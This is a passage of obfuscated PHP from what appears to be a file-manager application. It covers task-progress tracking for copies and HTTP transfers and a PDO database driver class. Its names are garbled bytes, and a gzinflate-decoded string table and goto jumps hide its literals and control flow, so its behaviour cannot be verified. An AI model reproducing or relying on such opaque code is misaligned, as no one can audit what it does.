== $ø¦–Áí) { return; } if (substr($ÖäÔî› , 0, strlen($ø¦–Áí)) == $ø¦–Áí) { return; } $Ù¢æß Š =& $this->task; $Ù¢æß Š[$şÀ¡‡ô[1723]] = KodIO::transferType($ùøÕ×®ş, $š¥ïòÄ); $this->update(); } public function updateAfter() { $íç¶…ÒÙ =& $_SERVER[ñˆ‹ß¿÷]; $âå¢§óœ =& $this->task; if (!$âå¢§óœ[$íç¶…ÒÙ[770]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($âå¢§óœ[$íç¶…ÒÙ[1723]] == $íç¶…ÒÙ[1311]) { return; } self::updateTask($âå¢§óœ); } private static function updateTask(&$ˆÛøìµ) { $æä‡¤° =& $_SERVER[ñˆ‹ß¿÷]; if ($ˆÛøìµ[$æä‡¤°[1723]] == $æä‡¤°[1206] || $ˆÛøìµ[$æä‡¤°[1723]] == $æä‡¤°[107]) { if ($ˆÛøìµ[$æä‡¤°[1717]]) { $ˆÛøìµ[$æä‡¤°[1720]] = $ˆÛøìµ[$æä‡¤°[1719]] + $ˆÛøìµ[$æä‡¤°[1716]]; } } else { if ($ˆÛøìµ[$æä‡¤°[1723]] == $æä‡¤°[1312]) { if ($ˆÛøìµ[$æä‡¤°[1717]] == $æä‡¤°[1206]) { $ˆÛøìµ[$æä‡¤°[1720]] = $ˆÛøìµ[$æä‡¤°[1719]] + $ˆÛøìµ[$æä‡¤°[1716]] * 0.5; } else { if ($ˆÛøìµ[$æä‡¤°[1717]] == $æä‡¤°[107]) { $ˆÛøìµ[$æä‡¤°[1720]] = $ˆÛøìµ[$æä‡¤°[1719]] + $ˆÛøìµ[$æä‡¤°[1715]] * 0.5 + $ˆÛøìµ[$æä‡¤°[1716]] * 0.5; } } } } $ˆÛøìµ[$æä‡¤°[1666]] = $ˆÛøìµ[$æä‡¤°[1720]] / $ˆÛøìµ[$æä‡¤°[770]]; if ($ˆÛøìµ[$æä‡¤°[1666]] > 0) { $û¶–›Ÿí = timeFloat() - $ˆÛøìµ[$æä‡¤°[1668]] - $ˆÛøìµ[$æä‡¤°[1671]]; $ˆÛøìµ[$æä‡¤°[1672]] = $û¶–›Ÿí * (1 - $ˆÛøìµ[$æä‡¤°[1666]]) / $ˆÛøìµ[$æä‡¤°[1666]]; } } public function addPath($‹·å¢ËÇ) { $Å‚Ï–’º =& $_SERVER[ñˆ‹ß¿÷]; if (!$‹·å¢ËÇ) { return; } $»é¤Òüë =& $this->task; $ ªøµÅ = IO::infoWithChildren($‹·å¢ËÇ); $È¤Şá = $»é¤Òüë[$Å‚Ï–’º[1724]] ? $»é¤Òüë[$Å‚Ï–’º[1724]][$Å‚Ï–’º[1725]] : 0; $»é¤Òüë[$Å‚Ï–’º[1724]] = array($Å‚Ï–’º[1725] => $È¤Şá + 1, $Å‚Ï–’º[420] => $ ªøµÅ[$Å‚Ï–’º[32]], $Å‚Ï–’º[84] => $ ªøµÅ[$Å‚Ï–’º[84]], $Å‚Ï–’º[519] => $ ªøµÅ[$Å‚Ï–’º[519]] ? $ ªøµÅ[$Å‚Ï–’º[519]] : $ ªøµÅ[$Å‚Ï–’º[84]]); if ($ ªøµÅ[$Å‚Ï–’º[33]] == $Å‚Ï–’º[199]) { $»é¤Òüë[$Å‚Ï–’º[793]] += 1; } else { $»é¤Òüë[$Å‚Ï–’º[793]] += $ ªøµÅ[$Å‚Ï–’º[79]][$Å‚Ï–’º[77]]; if ($ ªøµÅ[$Å‚Ï–’º[402]]) { $»é¤Òüë[$Å‚Ï–’º[793]] += $ ªøµÅ[$Å‚Ï–’º[79]][$Å‚Ï–’º[78]] + 1; } } $»é¤Òüë[$Å‚Ï–’º[770]] += $ ªøµÅ[$Å‚Ï–’º[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($áÜ·Æ†) { } public function sourceAddHashEnd($ŞÄÙ’…Ï) { } public function sourceAddFileStart($ˆ‰Ò•Ÿ”) { $ñªÒ‘Ï– =& $_SERVER[ñˆ‹ß¿÷]; $¿ŒŞåÔ =& $this->task; $¿ŒŞåÔ[$ñªÒ‘Ï–[1715]] = $ˆ‰Ò•Ÿ”[$ñªÒ‘Ï–[76]]; $¿ŒŞåÔ[$ñªÒ‘Ï–[1713]] = $ˆ‰Ò•Ÿ”[$ñªÒ‘Ï–[32]]; $¿ŒŞåÔ[$ñªÒ‘Ï–[1071]] = $ˆ‰Ò•Ÿ”[$ñªÒ‘Ï–[32]]; $¿ŒŞåÔ[$ñªÒ‘Ï–[1726]] = $ˆ‰Ò•Ÿ”[$ñªÒ‘Ï–[84]]; $this->update(); } public function sourceAddFileEnd($å¯½Î±™) { $Ş£ä®ÛÍ =& $_SERVER[ñˆ‹ß¿÷]; $Òû¦˜¾¾ =& $this->task; $Òû¦˜¾¾[$Ş£ä®ÛÍ[1720]] += $å¯½Î±™[$Ş£ä®ÛÍ[76]]; $Òû¦˜¾¾[$Ş£ä®ÛÍ[1726]] = $å¯½Î±™[$Ş£ä®ÛÍ[84]]; $this->update(1); } public function copyFileStart($í¸÷Š, $ì¹Ê¨û§, $»…©‹¡, $‚Óñ’”ô, $İÛûßÉ, $ˆÜ×Â×«) { $¡…ºÑºù =& $_SERVER[ñˆ‹ß¿÷]; $·÷ŠÏ = $İÛûßÉ; if ($·÷ŠÏ == $GLOBALS[$¡…ºÑºù[1727]]) { $·÷ŠÏ = $GLOBALS[$¡…ºÑºù[1728]]; } $GLOBALS[$¡…ºÑºù[1728]] = $İÛûßÉ; $GLOBALS[$¡…ºÑºù[1727]] = $ˆÜ×Â×«; $•§·ƒü¤ =& $this->task; $•§·ƒü¤[$¡…ºÑºù[1713]] = $·÷ŠÏ; $•§·ƒü¤[$¡…ºÑºù[1715]] = (int) $í¸÷Š->size($ì¹Ê¨û§); $•§·ƒü¤[$¡…ºÑºù[1716]] = 0; $•§·ƒü¤[$¡…ºÑºù[1071]] = $¡…ºÑºù[12]; $•§·ƒü¤[$¡…ºÑºù[1717]] = $¡…ºÑºù[12]; $•§·ƒü¤[$¡…ºÑºù[1718]] = 0; $©¯çÈÒ = $•§·ƒü¤[$¡…ºÑºù[1715]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($•§·ƒü¤[$¡…ºÑºù[399]] . $¡…ºÑºù[1729]); if ($©¯çÈÒ && file_exists(get_path_father($‚Óñ’”ô))) { Cache::set($•§·ƒü¤[$¡…ºÑºù[399]] . $¡…ºÑºù[1729], $‚Óñ’”ô); $•§·ƒü¤[$¡…ºÑºù[1686]] = array($¡…ºÑºù[1730], $¡…ºÑºù[1731]); } $this->update(0, $©¯çÈÒ); } public static function updateCopyLocalFileSize($÷¤†®Ï†) { $¯¹èÙÇ =& $_SERVER[ñˆ‹ß¿÷]; $ä‹£¤½ = Cache::get($÷¤†®Ï†[$¯¹èÙÇ[399]] . $¯¹èÙÇ[1729]); if (!$ä‹£¤½ || !file_exists($ä‹£¤½)) { return $÷¤†®Ï†; } $÷¤†®Ï†[$¯¹èÙÇ[1716]] = @filesize($ä‹£¤½); $÷¤†®Ï†[$¯¹èÙÇ[1720]] += $÷¤†®Ï†[$¯¹èÙÇ[1716]]; self::updateTask($÷¤†®Ï†); return $÷¤†®Ï†; } public function copyFileEnd($®ë«¹èâ, $†—ÃÚ­÷, $ÊşÂÉéÁ, $öÅÙáõ, $©æ™Óœ‰, $ÌÜÑ¥•Ê) { $µ‹ÒÉÜ =& $_SERVER[ñˆ‹ß¿÷]; $‹ŞÃ’öÃ =& $this->task; $‹ŞÃ’öÃ[$µ‹ÒÉÜ[1716]] = $‹ŞÃ’öÃ[$µ‹ÒÉÜ[1715]]; $‹ŞÃ’öÃ[$µ‹ÒÉÜ[1717]] = $µ‹ÒÉÜ[12]; unset($‹ŞÃ’öÃ[$µ‹ÒÉÜ[1686]]); if ($©æ™Óœ‰ == $‹ŞÃ’öÃ[$µ‹ÒÉÜ[1713]]) { $‹ŞÃ’öÃ[$µ‹ÒÉÜ[1719]] += $‹ŞÃ’öÃ[$µ‹ÒÉÜ[1715]]; $‹ŞÃ’öÃ[$µ‹ÒÉÜ[1720]] = $‹ŞÃ’öÃ[$µ‹ÒÉÜ[1719]]; $¬÷²Ó¹ = 1; if (isset($‹ŞÃ’öÃ[$µ‹ÒÉÜ[1726]]) && $‹ŞÃ’öÃ[$µ‹ÒÉÜ[1726]] == $†—ÃÚ­÷) { $¬÷²Ó¹ = 0; } $this->update($¬÷²Ó¹); } else { $this->update(); $‹ŞÃ’öÃ[$µ‹ÒÉÜ[1716]] = 0; } Cache::remove($‹ŞÃ’öÃ[$µ‹ÒÉÜ[399]] . $µ‹ÒÉÜ[1729]); self::log($µ‹ÒÉÜ[1732] . $†—ÃÚ­÷ . $µ‹ÒÉÜ[70] . $öÅÙáõ . $µ‹ÒÉÜ[231] . $©æ™Óœ‰ . $µ‹ÒÉÜ[1733] . $‹ŞÃ’öÃ[$µ‹ÒÉÜ[1713]]); } public function updateFileEnd($ñÖÓÇÌ…, $Ï¥Ë¸¯„) { $ß½°³¸• =& $_SERVER[ñˆ‹ß¿÷]; $‹÷Ì×áª =& $this->task; $‹÷Ì×áª[$ß½°³¸•[1713]] = $ñÖÓÇÌ…; $‹÷Ì×áª[$ß½°³¸•[1715]] = $Ï¥Ë¸¯„; $‹÷Ì×áª[$ß½°³¸•[1719]] += $Ï¥Ë¸¯„; $‹÷Ì×áª[$ß½°³¸•[1720]] = $‹÷Ì×áª[$ß½°³¸•[1719]]; $this->update(1); self::log($ß½°³¸•[1734] . $ñÖÓÇÌ…); } public function sourceModelCopy($ûëö Ï˜) { $Áò¬¹Îş =& $_SERVER[ñˆ‹ß¿÷]; $¹‡ˆóõĞ = $ûëö Ï˜[0]; $ÓÕÁø« = $ûëö Ï˜[1]; $×£î¿±£ =& $this->task; $this->sourceModelCopyFlag = !0; $Óí¨ÛÄì = 0; switch ($¹‡ˆóõĞ) { case $Áò¬¹Îş[572]: $Óí¨ÛÄì = 1; break; case $Áò¬¹Îş[575]: $×£î¿±£[$Áò¬¹Îş[1713]] = $ÓÕÁø«[$Áò¬¹Îş[32]]; break; case $Áò¬¹Îş[577]: $Óí¨ÛÄì = intval($ûëö Ï˜[$Áò¬¹Îş[380]] * 0.4); break; case $Áò¬¹Îş[579]: $Óí¨ÛÄì = intval($ûëö Ï˜[$Áò¬¹Îş[380]] * 0.2); break; case $Áò¬¹Îş[581]: $Óí¨ÛÄì = intval($ûëö Ï˜[$Áò¬¹Îş[380]] * 0.4); break; } $this->update($Óí¨ÛÄì); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ÂÜÂ¹¦, $ó„’“’é) { $óâù—³ =& $_SERVER[ñˆ‹ß¿÷]; $this->sourceModelCopyFlag = !0; $–Ë›«·µ = 1; if (isset($ÂÜÂ¹¦[$óâù—³[79]])) { $–Ë›«·µ = $ÂÜÂ¹¦[$óâù—³[79]][$óâù—³[77]]; $–Ë›«·µ = $–Ë›«·µ + $ÂÜÂ¹¦[$óâù—³[79]][$óâù—³[78]] + 1; } $this->update($–Ë›«·µ); $this->sourceModelCopyFlag = !1; } public function sourceMove($Üƒ¥œşÚ) { $this->sourceRemove($Üƒ¥œşÚ, !1); } public function curlProgress($ã»îæ…ü, $™÷€°Û–, $œ¦ƒ…»î, $ÌÑµá¡õ, $Œ…¯ÜÚÑ) { $‹¢Š†Õ® =& $_SERVER[ñˆ‹ß¿÷]; $û¦ÎÆ±Ô =& $this->task; if ($Œ…¯ÜÚÑ > 0) { $û¦ÎÆ±Ô[$‹¢Š†Õ®[1071]] = $‹¢Š†Õ®[1735]; $û¦ÎÆ±Ô[$‹¢Š†Õ®[1717]] = $‹¢Š†Õ®[107]; if ($û¦ÎÆ±Ô[$‹¢Š†Õ®[1715]]) { $û¦ÎÆ±Ô[$‹¢Š†Õ®[1716]] = $Œ…¯ÜÚÑ; } if ($û¦ÎÆ±Ô[$‹¢Š†Õ®[1718]]) { $û¦ÎÆ±Ô[$‹¢Š†Õ®[1716]] = $Œ…¯ÜÚÑ + $û¦ÎÆ±Ô[$‹¢Š†Õ®[1718]]; } } else { if ($œ¦ƒ…»î > 0) { if ($û¦ÎÆ±Ô[$‹¢Š†Õ®[1715]] == $™÷€°Û–) { $û¦ÎÆ±Ô[$‹¢Š†Õ®[1716]] = $œ¦ƒ…»î; $û¦ÎÆ±Ô[$‹¢Š†Õ®[1071]] = $‹¢Š†Õ®[1736]; $û¦ÎÆ±Ô[$‹¢Š†Õ®[1717]] = $‹¢Š†Õ®[1206]; } } } $this->update(); } public function curlProgressStart($‡Êô§üÕ) { } public function curlProgressEnd($‹ğŞùØí) { $ØÍ„ıÄÙ =& $_SERVER[ñˆ‹ß¿÷]; $ä–À½ œ =& $this->task; $âóà–èá = curl_getinfo($‹ğŞùØí); $”ùò¼ Á = $âóà–èá[$ØÍ„ıÄÙ[1737]]; if ($”ùò¼ Á == -1) { $”ùò¼ Á = $âóà–èá[$ØÍ„ıÄÙ[1738]]; } if ($ä–À½ œ[$ØÍ„ıÄÙ[1717]] == $ØÍ„ıÄÙ[107] && $”ùò¼ Á) { $ä–À½ œ[$ØÍ„ıÄÙ[1718]] += $”ùò¼ Á; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $›¾îˆôÍ =& $_SERVER[ñˆ‹ß¿÷]; $û¡Şİ· =& $this->task; $û¡Şİ·[$›¾îˆôÍ[1739]] = 1; Hook::bind($›¾îˆôÍ[1707], array($this, $›¾îˆôÍ[1740])); Hook::bind($›¾îˆôÍ[1709], array($this, $›¾îˆôÍ[1741])); Hook::bind($›¾îˆôÍ[1711], array($this, $›¾îˆôÍ[1742])); } protected function endAfter() { $—ºíáê =& $_SERVER[ñˆ‹ß¿÷]; Hook::unbind($—ºíáê[1707], array($this, $—ºíáê[1740])); Hook::unbind($—ºíáê[1709], array($this, $—ºíáê[1741])); Hook::unbind($—ºíáê[1711], array($this, $—ºíáê[1742])); } public function progressStart($Æ³Áß) { $çÕİ÷Üô =& $_SERVER[ñˆ‹ß¿÷]; $˜´áì‡˜ = curl_getinfo($Æ³Áß); self::log($çÕİ÷Üô[1743] . $˜´áì‡˜[$çÕİ÷Üô[307]]); self::valueSet($this->task[$çÕİ÷Üô[399]], $this->task); } public function progressEnd($ÎçÀèÌ) { $ìÊüô =& $_SERVER[ñˆ‹ß¿÷]; self::log($ìÊüô[1744] . $this->task[$ìÊüô[399]]); $this->end(); } public function progress($ ¸ô²Šé, $ú®å¦Ùì, $ñœÖó†ñ, $©ªš÷äñ, $øè›ƒ ÷) { $”°óºâˆ =& $_SERVER[ñˆ‹ß¿÷]; $Õî÷šşİ =& $this->task; if ($øè›ƒ ÷ > 0) { $Õî÷šşİ[$”°óºâˆ[793]] = $Õî÷šşİ[$”°óºâˆ[793]] == 0 ? $©ªš÷äñ : $Õî÷šşİ[$”°óºâˆ[793]]; $Õî÷šşİ[$”°óºâˆ[1665]] = $øè›ƒ ÷; } else { if ($ñœÖó†ñ > 0) { $Õî÷šşİ[$”°óºâˆ[793]] = $Õî÷šşİ[$”°óºâˆ[793]] == 0 ? $ú®å¦Ùì : $Õî÷šşİ[$”°óºâˆ[793]]; $Õî÷šşİ[$”°óºâˆ[1665]] = $ñœÖó†ñ; } } $this->update(); self::log("\x70\x72\157\147\x72\145\163\163\x48\164\164\x70\x3a\x64\x6f\167\x6e\x3a{$ñœÖó†ñ}\x2f{$ú®å¦Ùì}\73\40\x75\x70\x6c\157\141\144\72{$øè›ƒ ÷}\57{$©ªš÷äñ}\x3b"); } } goto A—åš°²¾; eÄæ»‘ªÆ¼: $_SERVER[ìõ½ó«ú] = explode($_SERVER[ñˆ‹ß¿÷][616], gzinflate(substr($_SERVER[ñˆ‹ß¿÷][617], 10, -8))); $ypsajfmbng = $_SERVER[ñˆ‹ß¿÷][618]; if (strlen($ypsajfmbng) < $_SERVER[ñˆ‹ß¿÷][619]) { return; } goto D‚ƒé©‰Èù; BƒÓóÄâæ‚: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ãòÛŠŠù = '') { $öãçÉ• =& $_SERVER[ñˆ‹ß¿÷]; if (!class_exists($öãçÉ•[921])) { think_exception(think_lang($öãçÉ•[14]) . $öãçÉ•[922]); } if (!empty($ãòÛŠŠù)) { $this->config = $ãòÛŠŠù; if (empty($this->config[$öãçÉ•[17]])) { $this->config[$öãçÉ•[17]] = array(); } } } public function connect($ÓÄÜÃÖ = '', $òÏŒ½åÓ = 0) { $¦ÀìëÉ =& $_SERVER[ñˆ‹ß¿÷]; if (!isset($this->linkID[$òÏŒ½åÓ])) { if (empty($ÓÄÜÃÖ)) { $ÓÄÜÃÖ = $this->config; } $Ş…èø´¦ = !empty($ÓÄÜÃÖ[$¦ÀìëÉ[17]][$¦ÀìëÉ[18]]) ? $ÓÄÜÃÖ[$¦ÀìëÉ[17]][$¦ÀìëÉ[18]] : $this->pconnect; if ($Ş…èø´¦) { $ÓÄÜÃÖ[$¦ÀìëÉ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$òÏŒ½åÓ] = new PDO($ÓÄÜÃÖ[$¦ÀìëÉ[923]], $ÓÄÜÃÖ[$¦ÀìëÉ[895]], $ÓÄÜÃÖ[$¦ÀìëÉ[896]], $ÓÄÜÃÖ[$¦ÀìëÉ[17]]); } catch (PDOException $¬ûššœ’) { think_exception($¬ûššœ’->getMessage()); } $this->dbType = $this->_getDsnType($ÓÄÜÃÖ[$¦ÀìëÉ[923]]); if (in_array($this->dbType, array($¦ÀìëÉ[924], $¦ÀìëÉ[925], $¦ÀìëÉ[926], $¦ÀìëÉ[927]))) { think_exception($¦ÀìëÉ[928] . $this->dbType . $¦ÀìëÉ[929] . $this->dbType . $¦ÀìëÉ[930]); } if (!$this->linkID[$òÏŒ½åÓ]) { think_exception($¦ÀìëÉ[931]); } try { $this->linkID[$òÏŒ½åÓ]->exec($¦ÀìëÉ[932] . think_config($¦ÀìëÉ[898])); } catch (Exception $¬ûššœ’) { } $this->connected = !0; if (1 != think_config($¦ÀìëÉ[22])) { unset($this->config); } } return $this->linkID[$òÏŒ½åÓ]; } public function free() { $this->PDOStatement = null; } public function query($‡Û¯‚şÉ, $Ò™é¸â = array()) { $ŸĞ¢Õöá =& $_SERVER[ñˆ‹ß¿÷]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‡Û¯‚şÉ; if (!empty($Ò™é¸â)) { $this->queryStr .= $ŸĞ¢Õöá[933] . print_r($Ò™é¸â, !0) . $ŸĞ¢Õöá[934]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ŸĞ¢Õöá[23], 1); think_status($ŸĞ¢Õöá[24]); $this->PDOStatement = $this->_linkID->prepare($‡Û¯‚şÉ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¸Œã¡ñ = $this->PDOStatement->execute($Ò™é¸â); $this->debug(); if (!1 === $¸Œã¡ñ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($÷¿Úâ˜©, $ÔÀ´€ = array()) { $€·» –· =& $_SERVER[ñˆ‹ß¿÷]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $÷¿Úâ˜©; if (!empty($ÔÀ´€)) { $this->queryStr .= $€·» –·[933] . print_r($ÔÀ´€, !0) . $€·» –·[934]; } $¡ĞÈğ› = !1; if ($this->dbType == $€·» –·[927]) { if (preg_match($€·» –·[935], $this->queryStr, $á¼éµë§)) { $this->table = think_config($€·» –·[936]) . str_ireplace(think_config($€·» –·[937]), $€·» –·[378], $á¼éµë§[2]); $¡ĞÈğ› = (bool) $this->query($€·» –·[938] . strtoupper($this->table) . $€·» –·[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($€·» –·[25], 1); think_status($€·» –·[24]); $this->PDOStatement = $this->_linkID->prepare($÷¿Úâ˜©); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $«›¥ãùÊ = $this->PDOStatement->execute($ÔÀ´€); $this->debug(); if (!1 === $«›¥ãùÊ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($¡ĞÈğ› || preg_match($€·» –·[939], $÷¿Úâ˜©)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $èôÜ÷†” = $this->_linkID->commit(); $this->transTimes = 0; if (!$èôÜ÷†”) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÌÊ’‹•½ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ÌÊ’‹•½) { $this->error(); return !1; } } return !0; } private function getAll() { $œîÈªŸ½ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($œîÈªŸ½); return $œîÈªŸ½; } public function getFields($–™‡™™) { $ã—–ïŠ =& $_SERVER[ñˆ‹ß¿÷]; $this->initConnect(!0); if (think_config($ã—–ïŠ[940])) { $ÎÊ¨ßğ… = str_replace($ã—–ïŠ[941], $–™‡™™, think_config($ã—–ïŠ[940])); } else { switch ($this->dbType) { case $ã—–ïŠ[924]: case $ã—–ïŠ[942]: $ÎÊ¨ßğ… = "\x53\x45\114\x45\x43\x54\40\x20\x20\143\x6f\x6c\165\155\x6e\137\x6e\141\x6d\145\x20\141\163\40\x27\116\x61\x6d\145\x27\54\40\40\40\144\141\164\141\137\x74\171\x70\x65\x20\141\163\x20\47\x54\x79\x70\x65\x27\x2c\x20\x20\40\143\x6f\x6c\x75\x6d\x6e\137\144\x65\x66\x61\165\154\x74\40\141\x73\x20\47\104\x65\x66\x61\165\154\x74\x27\54\40\x20\40\151\x73\137\156\165\x6c\154\141\142\x6c\x65\x20\x61\x73\40\x27\116\x75\154\154\x27\12\11\11\x46\122\117\x4d\x9\x69\156\x66\157\162\155\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\145\x6d\x61\x2e\x74\141\x62\154\x65\x73\40\x41\x53\x20\164\12\11\x9\x4a\117\x49\x4e\11\151\156\146\157\162\155\x61\x74\x69\157\x6e\137\x73\143\150\145\x6d\141\56\143\157\154\x75\x6d\x6e\163\40\101\x53\x20\x63\xa\x9\11\117\x4e\40\x20\164\56\x74\x61\142\154\145\137\x63\x61\x74\141\154\157\x67\x20\x3d\x20\x63\56\x74\141\x62\x6c\x65\137\x63\141\x74\x61\154\x6f\147\xa\x9\11\x41\116\x44\40\164\56\x74\x61\x62\x6c\145\x5f\163\x63\150\x65\155\141\40\x3d\40\x63\56\164\x61\x62\x6c\x65\x5f\x73\x63\x68\145\155\x61\12\11\11\x41\116\104\x20\x74\x2e\164\x61\142\154\x65\x5f\156\x61\155\145\x20\x3d\40\x63\x2e\x74\x61\x62\154\145\137\156\x61\155\x65\xa\11\11\127\110\x45\122\105\40\40\x20\x74\x2e\164\x61\142\154\145\137\x6e\141\155\x65\x20\75\x20\x27{$–™‡™™}\47"; break; case $ã—–ïŠ[943]: $ÎÊ¨ßğ… = $ã—–ïŠ[944] . $–™‡™™ . $ã—–ïŠ[945]; break; case $ã—–ïŠ[925]: case $ã—–ïŠ[927]: $ÎÊ¨ßğ… = $ã—–ïŠ[946] . $ã—–ïŠ[947] . $ã—–ïŠ[948] . strtoupper($–™‡™™) . $ã—–ïŠ[949] . strtoupper($–™‡™™) . $ã—–ïŠ[950]; break; case $ã—–ïŠ[951]: $ÎÊ¨ßğ… = $ã—–ïŠ[952] . $–™‡™™ . $ã—–ïŠ[953]; break; case $ã—–ïŠ[926]: break; case $ã—–ïŠ[954]: default: $ÎÊ¨ßğ… = $ã—–ïŠ[955] . ($this->dbType == $ã—–ïŠ[954] ? "\140{$–™‡™™}\140" : $–™‡™™); } } $À®˜ÁÓÏ = $this->query($ÎÊ¨ßğ…); $”Œ‡²öÃ = array(); if ($À®˜ÁÓÏ) { foreach ($À®˜ÁÓÏ as $äõ‹½Ñó => $ø¶÷Ùƒ) { $ø¶÷Ùƒ = array_change_key_case($ø¶÷Ùƒ); $ø¶÷Ùƒ[$ã—–ïŠ[32]] = isset($ø¶÷Ùƒ[$ã—–ïŠ[32]]) ? $ø¶÷Ùƒ[$ã—–ïŠ[32]] : $ã—–ïŠ[378]; $ø¶÷Ùƒ[$ã—–ïŠ[33]] = isset($ø¶÷Ùƒ[$ã—–ïŠ[33]]) ? $ø¶÷Ùƒ[$ã—–ïŠ[33]] : $ã—–ïŠ[378]; $ß§¯õúÕ = isset($ø¶÷Ùƒ[$ã—–ïŠ[273]]) ? $ø¶÷Ùƒ[$ã—–ïŠ[273]] : $ø¶÷Ùƒ[$ã—–ïŠ[32]]; $”Œ‡²öÃ[$ß§¯õúÕ] = array($ã—–ïŠ[32] => $ß§¯õúÕ, $ã—–ïŠ[33] => $ø¶÷Ùƒ[$ã—–ïŠ[33]], $ã—–ïŠ[35] => (bool) (isset($ø¶÷Ùƒ[$ã—–ïŠ[103]]) && $ø¶÷Ùƒ[$ã—–ïŠ[103]] === $ã—–ïŠ[12] || isset($ø¶÷Ùƒ[$ã—–ïŠ[35]]) && $ø¶÷Ùƒ[$ã—–ïŠ[35]] === $ã—–ïŠ[12]), $ã—–ïŠ[37] => isset($ø¶÷Ùƒ[$ã—–ïŠ[37]]) ? $ø¶÷Ùƒ[$ã—–ïŠ[37]] : (isset($ø¶÷Ùƒ[$ã—–ïŠ[56]]) ? $ø¶÷Ùƒ[$ã—–ïŠ[56]] : $ã—–ïŠ[378]), $ã—–ïŠ[39] => isset($ø¶÷Ùƒ[$ã—–ïŠ[94]]) ? strtolower($ø¶÷Ùƒ[$ã—–ïŠ[94]]) == $ã—–ïŠ[41] : (isset($ø¶÷Ùƒ[$ã—–ïŠ[57]]) ? $ø¶÷Ùƒ[$ã—–ïŠ[57]] : !1), $ã—–ïŠ[42] => isset($ø¶÷Ùƒ[$ã—–ïŠ[956]]) ? strtolower($ø¶÷Ùƒ[$ã—–ïŠ[956]]) == $ã—–ïŠ[44] : (isset($ø¶÷Ùƒ[$ã—–ïŠ[94]]) ? $ø¶÷Ùƒ[$ã—–ïŠ[94]] : !1)); } } return $”Œ‡²öÃ; } public function getTables($¥ÔıÛÈ = '') { $ÑÕ¢ã­È =& $_SERVER[ñˆ‹ß¿÷]; if (think_config($ÑÕ¢ã­È[957])) { $“ì‚í±„ = str_replace($ÑÕ¢ã­È[958], $¥ÔıÛÈ, think_config($ÑÕ¢ã­È[957])); } else { switch ($this->dbType) { case $ÑÕ¢ã­È[925]: case $ÑÕ¢ã­È[927]: $“ì‚í±„ = $ÑÕ¢ã­È[959]; break; case $ÑÕ¢ã­È[924]: case $ÑÕ¢ã­È[942]: $“ì‚í±„ = $ÑÕ¢ã­È[960]; break; case $ÑÕ¢ã­È[951]: $“ì‚í±„ = $ÑÕ¢ã­È[961]; break; case $ÑÕ¢ã­È[926]: think_exception(think_lang($ÑÕ¢ã­È[962]) . $ÑÕ¢ã­È[963]); break; case $ÑÕ¢ã­È[943]: $“ì‚í±„ = $ÑÕ¢ã­È[45] . $ÑÕ¢ã­È[46] . $ÑÕ¢ã­È[47]; break; case $ÑÕ¢ã­È[954]: default: if (!empty($¥ÔıÛÈ)) { $“ì‚í±„ = $ÑÕ¢ã­È[906] . $¥ÔıÛÈ . $ÑÕ¢ã­È[907]; } else { $“ì‚í±„ = $ÑÕ¢ã­È[908]; } } } $éÜööÇÂ = $this->query($“ì‚í±„); $çíçİñÅ = array(); foreach ($éÜööÇÂ as $ñ‡§ûÅØ => $¾ó€…ö) { $çíçİñÅ[$ñ‡§ûÅØ] = current($¾ó€…ö); } return $çíçİñÅ; } protected function parseLimit($æÓ¯³ˆô) { $û¼ÂéÕ =& $_SERVER[ñˆ‹ß¿÷]; $±Ä²®º = $û¼ÂéÕ[12]; if (!empty($æÓ¯³ˆô)) { switch ($this->dbType) { case $û¼ÂéÕ[951]: case $û¼ÂéÕ[943]: $æÓ¯³ˆô = explode($û¼ÂéÕ[50], $æÓ¯³ˆô); if (count($æÓ¯³ˆô) > 1) { $±Ä²®º .= $û¼ÂéÕ[51] . $æÓ¯³ˆô[1] . $û¼ÂéÕ[52] . $æÓ¯³ˆô[0] . $û¼ÂéÕ[53]; } else { $±Ä²®º .= $û¼ÂéÕ[51] . $æÓ¯³ˆô[0] . $û¼ÂéÕ[53]; } break; case $û¼ÂéÕ[924]: case $û¼ÂéÕ[942]: break; case $û¼ÂéÕ[926]: break; case $û¼ÂéÕ[925]: case $û¼ÂéÕ[927]: break; case $û¼ÂéÕ[954]: default: $±Ä²®º .= $û¼ÂéÕ[51] . $æÓ¯³ˆô . $û¼ÂéÕ[53]; } } return $±Ä²®º; } public function parseKey(&$½ğåœëİ, $óúãîêä = true) { $í¶ûª¼— =& $_SERVER[ñˆ‹ß¿÷]; if ($óúãîêä) { $½ğåœëİ = $this->parseKeyCheck($½ğåœëİ); } if ($this->dbType == $í¶ûª¼—[954]) { if ($½ğåœëİ != $í¶ûª¼—[188] && !preg_match($í¶ûª¼—[918], $½ğåœëİ)) { $½ğåœëİ = $í¶ûª¼—[385] . trim($½ğåœëİ, $í¶ûª¼—[385]) . $í¶ûª¼—[385]; } return $½ğåœëİ; } else { return parent::parseKey($½ğåœëİ, $óúãîêä); } } public function close() { $this->_linkID = null; } public function error() { $§¼÷ìõş =& $_SERVER[ñˆ‹ß¿÷]; if ($this->PDOStatement) { $Ÿˆë = $this->PDOStatement->errorInfo(); $this->error = $Ÿˆë[1] . $§¼÷ìõş[4] . $Ÿˆë[2]; } else { $this->error 